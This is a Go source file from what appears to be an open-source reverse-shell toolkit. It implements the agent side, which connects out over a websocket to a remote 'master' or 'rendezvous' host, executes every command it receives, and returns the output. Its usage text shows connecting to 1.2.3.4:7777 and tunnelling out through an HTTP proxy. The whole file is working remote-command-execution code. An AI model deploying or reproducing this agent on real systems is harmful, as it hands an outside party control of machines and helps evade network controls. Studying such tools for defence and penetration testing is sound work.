package cmd

import (
	"errors"
	"fmt"
	"net/http"

	"github.com/golang/glog"
	"github.com/gorilla/websocket"
	"github.com/maxlaverse/reverse-shell/agent/handler"
	"github.com/maxlaverse/reverse-shell/message"
	"github.com/spf13/cobra"
)

const (
	websocketListenerExample = `# On the master (1.2.3.4)
$ reverse-shell-client listen --port 7777

# On the agent
$ reverse-shell-agent websocket --url http://1.2.3.4:7777

Once an agent connects, you will be able to write commands in *stdin* that will be directly executed on the agent. You can also connect to a rendezvous point instead of a master.

You can also connect to the outside using a proxy:
$ http_proxy=http://your-proxy:3128 https_proxy=http://your-proxy:3128 agent websocket -U http://1.2.3.4:7777
`
)

type websocketListenerOptions struct {
	url string
}

// NewWebsocketListenerCommand creates a new cobra.Command for `agent websocket`
func NewWebsocketListenerCommand(agent Cli) *cobra.Command {
	var opts websocketListenerOptions

	cmd := &cobra.Command{
		Use:              "websocket",
		Short:            "Agent that connects to a websocket endpoints and waits for commands",
		Long:             "Connect to a remote websocket and execute every command received. The remote host can be a `master` or a `rendezvous`.",
		Example:          websocketListenerExample,
		TraverseChildren: true,
		Args: func(cmd *cobra.Command, args []string) error {
			if len(opts.url) == 0 {
				return errors.New("a url must be given")
			}
			return nil
		},
		Run: func(cmd *cobra.Command, args []string) {
			agent.SafeStart(newWebsocketListener(opts.url))
		},
	}

	cmd.Flags().StringVarP(&opts.url, "url", "", "", "url of the remote websocket endpoint")

	return cmd
}

type websocketListener struct {
	baseURL              string
	processOutput        chan *handler.ProcessOutput
	processTerminated    chan *handler.ProcessTerminated
	input                chan *message.ExecuteCommand
	createProcessChannel chan *message.CreateProcess
	readerClosed         chan struct{}
	connectionLost       chan struct{}
	handler              *handler.Handler
}

func newWebsocketListener(baseURL string) *websocketListener {
	processOutput := make(chan *handler.ProcessOutput)
	processTerminated := make(chan *handler.ProcessTerminated)

	return &websocketListener{
		baseURL:              baseURL,
		processOutput:        processOutput,
		processTerminated:    processTerminated,
		input:                make(chan *message.ExecuteCommand),
		createProcessChannel: make(chan *message.CreateProcess),
		readerClosed:         make(chan struct{}),
		connectionLost:       make(chan struct{}),
		handler:              handler.NewHandler(processOutput, processTerminated),
	}
}

func (l *websocketListener) Start() error {
	return nil
}

func (l *websocketListener) Listen() error {
	ws, _, err := websocket.DefaultDialer.Dial(l.websocketURL(), http.Header{"Origin": {l.baseURL}})
	if err != nil {
		glog.Errorf("Failed to establish connection to %s: %v", l.websocketURL(), err)
		return err
	}

	glog.V(2).Infof("Sending list of active sessions (%d)", len(l.handler.Sessions()))
	send(ws, message.SessionTable{
		Sessions: l.handler.Sessions(),
	})

	go l.pipeFromProcessOutput(ws)
	go l.pipeToProcessInput(ws)

	glog.V(0).Infof("Ready and listening for incoming commands")
	for {
		select {
		case m := <-l.input:
			glog.V(2).Infof("Received %d bytes to be sent to process '%s'", len(m.Command), m.Id)
			l.handler.ExecuteCommand(m.Id, m.Command)
		case m := <-l.createProcessChannel:
			processID := l.handler.CreateProcess(m.CommandLine)
			glog.V(2).Infof("Session created for '%s'", m.Id)
			send(ws, message.ProcessCreated{Id: processID, WantedId: m.Id})
		case <-l.readerClosed:
			glog.V(2).Infof("Lost connection. Stopping the pipeFromProcessOutput loop")
			l.connectionLost <- struct{}{}
			glog.V(2).Infof("Main Loop stopped")
			return fmt.Errorf("Lost connection")
		}
	}
}

func (l *websocketListener) websocketURL() string {
	return "ws" + l.baseURL[4:] + "/agent/listen"
}

func (l *websocketListener) pipeToProcessInput(ws *websocket.Conn) {
	defer ws.Close()

	for {
		_, m, err := ws.ReadMessage()
		if err != nil {
			glog.Errorf("Error while reading from the websocket: %s", err)
			l.readerClosed <- struct{}{}
			glog.V(2).Infof("Stopping the pipeToProcessInput loop")
			return
		}
		b := message.FromBinary(m)
		switch v := b.(type) {
		case *message.ExecuteCommand:
			l.input <- v
		case *message.CreateProcess:
			l.createProcessChannel <- v
		default:
			glog.V(2).Infof("Received an unknown message type: %v", v)
		}
	}
}

func (l *websocketListener) pipeFromProcessOutput(ws *websocket.Conn) {
PipeLoop:
	for {
		select {
		case a := <-l.processOutput:
			glog.V(2).Infof("Received %d bytes from processOutput for '%s'", len(a.Result), a.Process.Name)
			send(ws, message.ProcessOutput{Id: a.Process.Name, Data: a.Result})

		case a := <-l.processTerminated:
			glog.V(2).Infof("Received a processTerminated signal! Forwarding")
			send(ws, message.ProcessTerminated{Id: a.Process.Name})

		case <-l.connectionLost:
			glog.V(2).Infof("Received a connectionLost signal! Stopping the loop")
			break PipeLoop
		}
	}
}

func send(ws *websocket.Conn, m message.Serializable) {
	ws.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
}
